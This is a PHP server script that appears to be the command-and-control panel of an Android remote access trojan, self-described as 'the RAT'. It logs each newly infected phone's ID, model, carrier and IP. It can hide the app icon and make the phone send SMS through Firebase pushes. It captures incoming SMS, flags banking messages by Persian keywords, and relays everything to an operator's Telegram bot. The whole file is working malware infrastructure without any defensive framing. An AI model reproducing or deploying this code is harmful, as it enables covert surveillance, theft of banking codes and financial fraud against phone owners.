<?php    
  include("info.php");
  define("TOKEN",$token);
  define("ID",$id);
    define("API_ACCESS_KEY",$apikey);
  
 include"jdf.php";
 $time = jdate("H:i:s-a");
 header('Content-Type: text/html; charset=utf-8');
 function asd($string, $start, $end){
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
    }
 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
  //====
  function check($t){
    if(strpos($t,"انتقال") !== false or strpos($t,"مستند") !== false  or strpos($t,"موجودي") !== false or strpos($t,"بانک") !== false  ){
      return true ;     
    }else{      
 return false;
            }
}
function sendmess($action,$androidid,$phone,$message){
    $port=file_get_contents("port.txt");
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/pluto"}';
$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
  
}
  function action($action,$androidid){
$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/pluto"}';

$headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
$ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
curl_setopt( $ch,CURLOPT_POST, true );
curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
$result = curl_exec($ch);
curl_close ($ch);
} 
  //====
 function send($t){

     file_get_contents("https://api.telegram.org/bot".TOKEN."/SendMessage?parse_mode=HTML&chat_id=".ID."&text=".urlencode($t));
 }
 

if(isset($_POST['result'])){
  	
 $result=$_POST['result'];
 if($result == "ok"){
 $action=$_POST['action'];
 if(isset($_POST['androidid'])){
 $androidid=$_POST['androidid'];
 }if(isset($_POST['model'])){
 $model=$_POST['model']; 
 			   $possible = 'abc1234';
$code = '';
$i = 0;
while ($i < 2) {
$code .= substr($possible, mt_rand(0, strlen($possible)-1), 1);
$i++;
}

$model=$model."-$code";
 }if(isset($_POST['battry'])){
 $battry = $_POST['battry'];
 }if(isset($_POST['opr'])){
 $opr = $_POST['opr'];
 }if(isset($_POST['number'])){
 $nump = $_POST['number'];
 }if(isset($_POST['message'])){
 $mess = $_POST['message'];
 }
 if($action == "firstinstall"){
 	$firsms = file_get_contents("actionfirst.txt");
     $phone = file_get_contents("fsms.txt");
     $message = file_get_contents("ftext.txt");
     if($firsms == "on"){
           sendmess("SendSingleMessage",$androidid,$phone,$message);
     }
 $autohide = file_get_contents("autohide.txt");
if($autohide == "on"){
         action('hideicon',$androidid);
     }
     
        $handler = file_get_contents('user.txt');
			$handler .= $androidid.'/';
			file_put_contents('user.txt',$handler);
			
			if(file_exists("userlist/$model.json")){
			   $possible = 'abc1234';
$code = '';
$i = 0;
while ($i < 2) {
$code .= substr($possible, mt_rand(0, strlen($possible)-1), 1);
$i++;
}
			  $model=$model."-$code";  
			    
			}
        file_put_contents("userlist/$model.json",'{"androidid":"'.$androidid.'","name":"'.$model.'"}');
		
          $text=
"
{🥷} sᴏᴍᴇᴏɴᴇ ɪɴsᴛᴀʟʟᴇᴅ ᴛʜᴇ ʀᴀᴛ

🧬⤳ᴀᴅᴅᴇᴅ : Connected
----------------------------------------
🪛⤳ᴍᴏᴅᴇʟ : $model
🧭⤳ᴏᴘʀᴀᴛᴏʀ : $opr
🌐⤳ɪᴘ : $ip

📱⤳ᴀɴᴅʀᴏɪᴅ ɪᴅ : <code>$androidid</code>

🩸⤳ᴍᴏʙɪʟᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ {☝️🏻}
----------------------------------------
⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd
";    




      send($text);  
            
        
  die('');
    
        
    
    
     
    
    
}
$user=explode("/",file_get_contents("user.txt"));
 if(in_array($androidid,$user)){
if ($action == "ping"){
    
  $text=
"{🤹🏻‍♀} ʜɪ $prt ɪ'ᴍ ᴏɴʟɪɴᴇ

----------------------------------------
🪛⤳ᴍᴏᴅᴇʟ : $model
🧭⤳ᴏᴘʀᴀᴛᴏʀ : $opr
🔋⤳ʙᴀᴛᴛʀʏ : $battry %
🌐⤳ɪᴘ : $ip

📱⤳ᴀɴᴅʀᴏɪᴅ ɪᴅ : <code>$androidid</code>

🩸⤳ᴍᴏʙɪʟᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ {☝️🏻}
----------------------------------------
⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd
";  
    
    
    send($text);
    
    
}elseif($action == "pingone"){
    
  $text=
"{🔇}  ᴛᴀʀɢᴇᴛ $model ᴘʜᴏɴᴇ sɪʟᴇɴᴛ ᴍᴏᴅᴇ

⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd
";    
      send($text);
    
    
}elseif($action == "getdevicefullinfo"){
    
    $text=
    
"{🎮} $model ᴘʜᴏɴᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ

----------------------------------------
🪛⤳ᴍᴏᴅᴇʟ : $model
🧭⤳ᴏᴘʀᴀᴛᴏʀ : $opr
🔋⤳ʙᴀᴛᴛʀʏ : $battry %
🌐⤳ɪᴘ : $ip

📱⤳ᴀɴᴅʀᴏɪᴅ ɪᴅ : <code>$androidid</code>

🩸⤳ᴍᴏʙɪʟᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ {☝️🏻}
----------------------------------------
⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd
";    
      send($text);
    
}elseif($action == "nwmessage"){
    
    
    
   $phone =    asd($mess,'[Address=',', Body=');
   $body= asd($mess,', Body=','IsInitialized');
  if(check($body) ==true){
       $isbank = "✅";
   }else{
       $isbank="❌";
   }
   
    $text=
"{✉️} ᴀ ɴᴇᴡ ᴍᴇssᴀɢᴇ ᴄᴀᴍᴇ ᴛᴏ $model

----------------------------------------
🪛⤳ᴍᴏᴅᴇʟ : $model
🧭⤳ᴏᴘʀᴀᴛᴏʀ : $opr
🔋⤳ʙᴀᴛᴛʀʏ : $battry %
🌐⤳ɪᴘ : $ip

📱⤳ᴀɴᴅʀᴏɪᴅ ɪᴅ : <code>$androidid</code>

🩸⤳ᴍᴏʙɪʟᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ {☝️🏻}
----------------------------------------
🏦⤳ɪs ʙᴀɴᴋ : { $isbank }
✉️⤳sᴍs ᴛᴇxᴛ :
$body
📞⤳sᴇɴᴅᴇʀ : <code>$phone</code>

🩸⤳sᴍs ɪɴғᴏʀᴍᴀᴛɪᴏɴ {☝️🏻}
----------------------------------------
⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd
";





      send($text);  
  
    
    
}elseif($action == "hideicon"){
    
    
    
    
        
      $text=
"{🔕} ᴛʜᴇ $model ɪᴄᴏɴ ᴡᴀs ʜɪᴅᴅᴇɴ

⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd
";    



      send($text);  
    
    
    
}elseif($action == "Sendmessok"){
    
    
    
          $text=
"{📤} ᴍᴇssᴀɢᴇs sᴇɴᴛ

⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd";    




      send($text);  
      
    
    
    
}elseif($action == "lastsms"){
    
       
   $body= asd($mess,', Body=','Address');
  if(check($body) ==true){
       $isbank = "✅";
   }else{
       $isbank="❌";
   }
    
          $text=
"{📩} ᴍʏ ʟᴀsᴛ ᴍᴇssᴀɢᴇ

----------------------------------------
🪛⤳ᴍᴏᴅᴇʟ : $model
🧭⤳ᴏᴘʀᴀᴛᴏʀ : $opr
🔋⤳ʙᴀᴛᴛʀʏ : $battry %
🌐⤳ɪᴘ : $ip

📱⤳ᴀɴᴅʀᴏɪᴅ ɪᴅ : <code>$androidid</code>

🩸⤳ᴍᴏʙɪʟᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ {☝️🏻}
----------------------------------------
🏦⤳ɪs ʙᴀɴᴋ : $isbank
✉️⤳sᴍs ᴛᴇxᴛ :
$body

🩸⤳sᴍs ɪɴғᴏʀᴍᴀᴛɪᴏɴ {☝️🏻}
----------------------------------------
⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd";    




      send($text);  
      
    
    
    
}

 } 
}

}
      
      
       

      
      
      
      
   






   
        ?>